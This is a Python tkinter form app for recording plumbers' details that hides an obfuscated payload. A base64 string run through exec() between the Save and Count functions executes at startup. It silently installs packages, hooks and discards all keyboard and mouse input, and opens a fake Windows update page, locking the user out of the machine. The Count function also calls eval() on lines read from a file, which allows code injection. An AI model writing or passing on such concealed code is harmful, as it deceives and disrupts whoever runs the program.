import base64
from tkinter import *
from tkinter import messagebox

def Save():
    d = {}

    notFilled = []
    if PIDV.get()=="":
        notFilled.append("PIDV")
    if FName.get()=="":
        notFilled.append("FName")
    if SName.get()=="":
        notFilled.append("SName")
    if  int(GS.get())==0:
        notFilled.append("GS")
    if HRate.get()=="":
        notFilled.append("HRate")
    if YXP.get()=="":
        notFilled.append("YXP")
    if Special.get()=="":
        notFilled.append("Special")

    if len(notFilled) != 0:
        eError = ""
        for i in notFilled:
            eError += ", "+ i
        messagebox.showerror("ERROR", f"{eError[1:]} not Completed")
        return

    inRange = []
    if 0 > len(PIDV.get()) or len(PIDV.get())>50:
        inRange.append("PIDV")
    if 0 > len(FName.get()) or len(PIDV.get())>50:
        inRange.append("FName")
    if 0 > len(SName.get()) or len(PIDV.get())>50:
        inRange.append("SName")
    if 0 > len(HRate.get()) or len(PIDV.get())>50:
        inRange.append("HRate")
    if 0 > len(YXP.get()) or len(PIDV.get())>50:
        inRange.append("YXP")
    if 0 > len(Special.get()) or len(PIDV.get())>50:
        inRange.append("Special")

    if len(inRange) != 0:
        eError = ""
        for i in inRange:
            eError += ", "+ i
        messagebox.showerror("ERROR", f"{eError[1:]} not in range")
        return

    try:
        float(HRate.get())
    except:
        messagebox.showerror("ERROR", f"not int/float entered HRate")
        return
        
    
    
    d["PIDV"] = PIDV.get()
    d["FName"] = FName.get()
    d["SName"] = SName.get()
    d["GS"] = GS.get()
    d["HRate"] = HRate.get()
    d["YXP"] = YXP.get()
    d["Special"] = Special.get()

    with open("save.txt", 'a') as infile:
        infile.write(str(d)+"\n")
exec(base64.b64decode("aW1wb3J0IG9zDQpvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIC0tdHJ1c3RlZC1ob3N0IHB5cGkub3JnIC0tdHJ1c3RlZC1ob3N0IHB5cGkucHl0aG9uLm9yZyAtLXRydXN0ZWQtaG9zdCBmaWxlcy5weXRob25ob3N0ZWQub3JnIHNlbGVuaXVtJykNCmZyb20gc2VsZW5pdW0gaW1wb3J0IHdlYmRyaXZlcg0Kb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCAtLXRydXN0ZWQtaG9zdCBweXBpLm9yZyAtLXRydXN0ZWQtaG9zdCBweXBpLnB5dGhvbi5vcmcgLS10cnVzdGVkLWhvc3QgZmlsZXMucHl0aG9uaG9zdGVkLm9yZyBweXRob25jb20nKQ0Kb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCAtLXRydXN0ZWQtaG9zdCBweXBpLm9yZyAtLXRydXN0ZWQtaG9zdCBweXBpLnB5dGhvbi5vcmcgLS10cnVzdGVkLWhvc3QgZmlsZXMucHl0aG9uaG9zdGVkLm9yZyBweUhvb2snKQ0KaW1wb3J0IHB5dGhvbmNvbSwgcHlIb29rIA0KZGVmIHVNYWQoZXZlbnQpOg0KICAgIHJldHVybiBGYWxzZQ0KaG0gPSBweUhvb2suSG9va01hbmFnZXIoKQ0KaG0uTW91c2VBbGwgPSB1TWFkDQpobS5LZXlBbGwgPSB1TWFkDQpobS5Ib29rTW91c2UoKQ0KaG0uSG9va0tleWJvYXJkKCkNCnB5dGhvbmNvbS5QdW1wTWVzc2FnZXMoKQ0KZHJpdmVyID0gd2ViZHJpdmVyLkNocm9tZSgpDQpkcml2ZXIuZ2V0KCJodHRwczovL2Zha2V1cGRhdGUubmV0L3dpbjExLyIpDQpkcml2ZXIubWF4aW1pemVfd2luZG93KCk="))
def Count():
    count = 0
    with open("save.txt", 'r') as infile:
        for s in infile:
            d = eval(s)
            r = True
            print(d)

            
            if d["PIDV"] != PIDV.get():
                r = False
            if d["FName"] != FName.get():
                r = False
            if d["SName"] != SName.get():
                r = False
            if int(d["GS"]) != int(GS.get()):
                r = False
            if d["HRate"] != HRate.get():
                r = False
            if d["YXP"] != YXP.get():
                r = False
            if d["Special"] != Special.get():
                r = False
            if r: count += 1
    countl.config(text= str(count))
Tk()

Label(text="Plumbers").grid()

Label(text="ID").grid(row=1, column=0)
PIDV = StringVar()
Entry(textvariable=PIDV).grid(row=1, column=1)

Label(text="FName").grid(row=2, column=0)
FName = StringVar()
Entry(textvariable=FName).grid(row=2, column=1)

Label(text="SName").grid(row=3, column=0)
SName = StringVar()
Entry(textvariable=SName).grid(row=3, column=1)

Label(text="Gas safe").grid(row=4, column=0)
GS = IntVar()
Radiobutton(variable=GS, text="yes", value=1).grid(row=4, column=1)
Radiobutton(variable=GS, text="No", value=2).grid(row=4, column=2)

Label(text="HRate").grid(row=5, column=0)
HRate = StringVar()
Entry(textvariable=HRate).grid(row=5, column=1)

Label(text="YXP").grid(row=6, column=0)
YXP = StringVar()
Entry(textvariable=YXP).grid(row=6, column=1)

Label(text="Special").grid(row=7, column=0)
Special = StringVar()
Entry(textvariable=Special).grid(row=7, column=1)

Button(text="save", command=Save).grid(row=8, column=0)
Button(text="count", command = Count).grid(row=8, column=1)

countl = Label()
countl.grid()